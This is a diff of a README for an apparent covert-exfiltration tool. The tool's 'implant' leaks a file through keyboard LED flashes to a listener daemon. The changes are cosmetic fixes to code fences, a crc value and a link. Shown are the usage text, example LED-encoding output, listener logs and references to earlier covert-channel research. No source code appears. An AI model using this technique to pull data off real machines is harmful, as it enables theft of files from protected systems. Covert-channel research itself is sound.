@@ -239,7 +239,7 @@ booted.  Don't get them mixed up.
 
 ## Running the Implant
 
-```Shell
+```
 Usage: kbdexfil.exe [-h] [-v] [-t timer] <file>
   version: 0.3.7
     -h          this help
@@ -270,11 +270,11 @@ that it has the full complement of lights, so will flash them invisibly.
 
 ## Example usage
 
-```Shell
+```
 > kbdexfil.exe -vv -t 2 test.txt
 timer: 2
 filename:       test9.txt
-size:290, crc:0x0x578853d1
+size:290, crc:0x578853d1
    C  (0x43)    (1,0,0,3)  1 4 0 7
    Q  (0x51)    (1,1,0,1)  1 5 0 5
    C  (0x43)    (1,0,0,3)  1 4 0 7
@@ -301,7 +301,7 @@ size:290, crc:0x0x578853d1
 
 ## Running the Listener
 
-```Shell
+```
 $ /usr/local/bin/kbdinfil -h
 Daemon to receive data from keyboard LEDs
   version: 0.3.7
@@ -335,7 +335,7 @@ and the script managing the back and forth.)
 The daemon is configured to use `LOCAL7` as the `syslog` facility.  The
 `rsyslog.d` config file directs it log to `/var/log/exfil.log`.
 
-```Shell
+```
 18:45:20 kbdinfil: ====== Keyboard LED Listener v0.3.7 ======
 18:45:20 kbdinfil: : /usr/local/sbin/kbdinfil
 18:45:20 kbdinfil: : PID: 4805
@@ -511,7 +511,7 @@ to the implant.
 ## References
 
 - [Neal Stephenson, Cryptonomicon]()
-- [HID Usage Tables 1.12](https://usb.org/hid])
+- [HID Usage Tables 1.12](https://usb.org/hid)
 - [Leaking data using DIY USB HID device](https://techblog.vsza.hu/posts/Leaking_data_using_DIY_USB_HID_device.html)
 - [Extracting data with keyboard emulation](https://hackaday.com/2012/10/30/extracting-data-with-keyboard-emulation)
 - [Reverse Keyboard LED Channel POC](https://forums.hak5.org/topic/25578-version-1-working-reverse-keyboard-led-channel-poc/)
